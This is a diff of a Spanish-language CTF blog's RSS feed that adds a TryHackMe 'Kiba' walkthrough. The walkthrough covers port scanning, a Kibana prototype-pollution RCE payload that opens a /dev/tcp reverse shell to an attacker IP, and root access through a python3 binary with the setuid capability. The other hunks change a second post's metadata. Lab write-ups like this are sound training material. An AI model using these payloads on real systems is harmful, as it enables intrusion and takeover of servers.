+&lt;/table&gt;
+&lt;h2 id=&#34;nmap--masscan&#34;&gt;NMAP &amp;amp; MASSCAN&lt;/h2&gt;
+&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto 5601, puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Aug 31 18:26:06 2020 as: nmap -sV -o mini_scan kiba.thm&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; kiba.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.22.111&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.24s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Aug 31 18:26:43 2020 -- 1 IP address (1 host up) scanned in 37.55 seconds&lt;/span&gt;
+
+masscan -p1-65535,U:1-65535 10.10.22.111 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0
+
+Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-08-31 22:51:38 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+Discovered open port 5601/tcp on 10.10.22.111
+Discovered open port 80/tcp on 10.10.22.111
+Discovered open port 22/tcp on 10.10.22.111
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
+&lt;p&gt;Encontramos una pagina web en el puerto 80 con una imagen ASCII de Cicada y con una frase interesante &lt;code&gt;&amp;quot;linux capabilities&amp;quot;&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_16-28-26.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
+&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos, no encontramos nada interesante.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/kiba$ gobuster dir -u http://kiba.thm/ -w &lt;span class=&#34;nv&#34;&gt;$LIST&lt;/span&gt;/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
+/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http-puerto-5601&#34;&gt;HTTP PUERTO 5601&lt;/h2&gt;
+&lt;p&gt;Encontramos el dashboard de kibana.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_16-56-39.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Realizamos un query (&lt;code&gt;_aliases&lt;/code&gt; y &lt;code&gt;.kibana/_search&lt;/code&gt; ambos GET) en la consola de &lt;code&gt;Dev Tools&lt;/code&gt; para ver la version de kibana y vemos que es &lt;code&gt;6.5.4&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-21-46.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;kibana--660---rce&#34;&gt;KIBANA &amp;lt; 6.6.0 - RCE&lt;/h2&gt;
+&lt;p&gt;Realizamos una busqueda de posibles exploits o vulnerabilidades para esta version de Kibana y encontramos un &lt;a href=&#34;https://slides.com/securitymb/prototype-pollution-in-kibana/#/54/0/0&#34;&gt;&lt;strong&gt;PoC que permite ejecutar comandos&lt;/strong&gt;&lt;/a&gt; a traves de la &amp;ldquo;contaminacion de un objeto&amp;rdquo;. Encontramos informacion de otros dos payloads y de como parchar esta vulnerabilidad en &lt;a href=&#34;https://github.com/mpgn/CVE-2019-7609&#34;&gt;&lt;strong&gt;Github&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Utilizamos el payload para obtener una shell inversa con los pasos que se muestran en el &lt;a href=&#34;https://slides.com/securitymb/prototype-pollution-in-kibana/#/54/0/0&#34;&gt;&lt;strong&gt;slide&lt;/strong&gt;&lt;/a&gt; y logramos obtener una shell.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;.es&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.props&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;label.__proto__.env.AAAA&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;require(&amp;#34;child_process&amp;#34;).exec(&amp;#34;bash -c \&amp;#39;&lt;/span&gt;bash -i&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.10.10.10/12345 0&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;1&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;);//&amp;#39;)
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.props(label.__proto__.env.NODE_OPTIONS=&amp;#39;--require /proc/self/environ&amp;#39;)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-35-43.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-36-08.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Logramos obtener nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-36-44.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;p&gt;Hacemos una pequeña enumeracion y vemos algunas configuraciones realizadas en un archivo que se encuentra en la carpeta principal que esta relacionada con capabilities, lo cual esta relacionado con la frase que encontramos en la pagina del puerto 80.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-40-47.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Realizamos una enumeracion con &lt;code&gt;getcap -r / 2&amp;gt;/dev/null&lt;/code&gt; para verificar que el archivo visto en el historial contiene estas &amp;ldquo;capacidades&amp;rdquo; (similares a los SUID). Vemos que aparece junto a otros.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-43-52.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Realizamos la explotacion de este archivo, que es python3 para obtener una shell root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./python3 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import os; os.setuid(0); os.system(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-48-47.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Informacion:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/&#34;&gt;&lt;strong&gt;Capabilities - Privilege Escalation&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/&#34;&gt;&lt;strong&gt;Capabilities - Privilege Escalation&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://twitter.com/chybeta/status/1184479040645632001&#34;&gt;&lt;strong&gt;Kibana - PoC&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.synacktiv.com/en/publications/pwning-an-outdated-kibana-with-not-so-sad-vulnerabilities.html&#34;&gt;&lt;strong&gt;Kibana - Sad Vulnerabilities&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/thm/kiba/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/thm/kiba/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>linux</category>
+            
+          
+        
+        
+          
+            
+              <category>tryhackme</category>
+            
+          
+        
+        
+      </item>
       
       <item>
         <title>TryHackMe - Harder</title>
@@ -51,17 +578,17 @@
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;Titulo&lt;/th&gt;
-&lt;th&gt;djinn&lt;/th&gt;
+&lt;th&gt;Harder&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;Info&lt;/td&gt;
-&lt;td&gt;Intermediate level vulnerable box.&lt;/td&gt;
+&lt;td&gt;Real pentest findings combined&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Puntos&lt;/td&gt;
-&lt;td&gt;60&lt;/td&gt;
+&lt;td&gt;160&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Dificultad&lt;/td&gt;
@@ -69,7 +596,7 @@
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Maker&lt;/td&gt;
-&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/falconfeast&#34;&gt;falconfeast&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/arcc&#34;&gt;arcc&lt;/a&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
@@ -138,7 +665,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 /secret.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Vemos que existe un directorio de &lt;code&gt;.git&lt;/code&gt; o más bien un repositorio expuesto. Utilizamos &lt;a href=&#34;https://github.com/internetwache/GitTools&#34;&gt;&lt;strong&gt;GitTools&lt;/strong&gt;&lt;/a&gt; para obtener lo que se pueda de este repositorio.&lt;/p&gt;
+&lt;/div&gt;&lt;h2 id=&#34;gittools&#34;&gt;GITTOOLS&lt;/h2&gt;
+&lt;p&gt;Vemos que existe un directorio de &lt;code&gt;.git&lt;/code&gt; o más bien un repositorio expuesto. Utilizamos &lt;a href=&#34;https://github.com/internetwache/GitTools&#34;&gt;&lt;strong&gt;GitTools&lt;/strong&gt;&lt;/a&gt; para obtener lo que se pueda de este repositorio.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_19-25-15.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Despues de realizar un &lt;code&gt;git checkout -- .&lt;/code&gt; para recuperar algunos archivos vemos 3 de ellos &lt;code&gt;.php&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_19-27-32.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
@@ -747,6 +1275,10 @@ X-Remote-Addr
           
             
               <category>linux</category>
+            
+          
+            
+              <category>gittools</category>
             
           
         
